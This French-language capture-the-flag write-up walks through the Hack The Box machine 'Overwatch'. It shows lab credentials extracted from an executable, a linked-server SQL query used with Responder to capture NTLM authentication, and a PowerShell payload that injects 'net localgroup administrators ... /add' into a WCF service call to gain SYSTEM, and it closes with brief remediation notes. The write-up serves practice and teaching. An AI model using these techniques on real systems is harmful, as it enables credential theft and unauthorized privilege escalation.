---
id: "HTB-2026-OVERWATCH"
title: "Overwatch"
excerpt: "Sur Overwatch, des identifiants SQL exposés permettent de capturer un hash NTLM via un serveur lié, puis une injection WCF donne une session LocalSystem."
date: "2026-02-07"
tags: ["WRITEUP", "HACKTHEBOX", "WINDOWS", "MEDIUM", "NTLM-CAPTURE", "WCF-SERVICE", "COMMAND-INJECTION"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "WINDOWS"
difficulty: "MEDIUM"
icon: "Terminal"
author: "0x7CC"
published: true
---

## TL;DR
Sur **Overwatch**, l'accès initial s'obtient en récupérant des identifiants SQL dans un exécutable sur un partage public, puis en forçant l'authentification d'un serveur SQL lié pour capturer le hash d'un compte privilégié. L'élévation s'appuie sur une injection de commande dans un service WCF local s'exécutant en tant que LocalSystem.

---

## Cible
- Host : `overwatch.htb`
- IP : `10.129.16.252`

---

## Recon : Partage de fichiers public
Le port 445 est accessible en lecture anonyme. Nous récupérons `overwatch.exe` du partage `software$`.

Nous en extrayons les identifiants codés en dur : `sqlsvc : TI0LKcfHzZw1Vv`.

---

## Accès Initial : Capture NTLM sur serveur lié
Nous nous connectons au serveur SQL. Nous observons un serveur lié `SQL07`. Nous lançons Responder sur notre machine d'attaque et exécutons la requête :

```sql
EXEC ('SELECT 1') AT [SQL07];
```

L'authentification NTLM fuitée nous donne le mot de passe de `sqlmgmt` : `bIhBbzMMnB82yx`. Nous nous connectons via WinRM.

---

## Élévation de privilèges : Injection de commande WCF
L'analyse de `overwatch.exe` montre que le service WCF (port 8000) exécute une fonction `KillProcess` vulnérable à une injection de commande PowerShell :

```powershell
$URI = "http://localhost:8000/MonitorService?wsdl"
$proxy = New-WebServiceProxy -Uri $URI -Namespace "WCF"
$payload = "test; net localgroup administrators overwatch\sqlmgmt /add #"
$proxy.KillProcess($payload)
```

La commande s'exécute en SYSTEM, ajoutant notre utilisateur au groupe Administrateurs.

---

## Notes défensives / remédiation

### Correctif
- Ne pas inclure d'identifiants en dur.
- Bloquer le trafic SQL sortant non autorisé.
- Assainir les entrées passées aux scripts PowerShell.

---

## Annexe : Résumé de la timeline
1. Téléchargement de l'exécutable et extraction d'identifiants.
2. Requête SQL liée pour intercepter les identifiants de `sqlmgmt`.
3. Injection dans le service WCF local pour obtenir root.

---
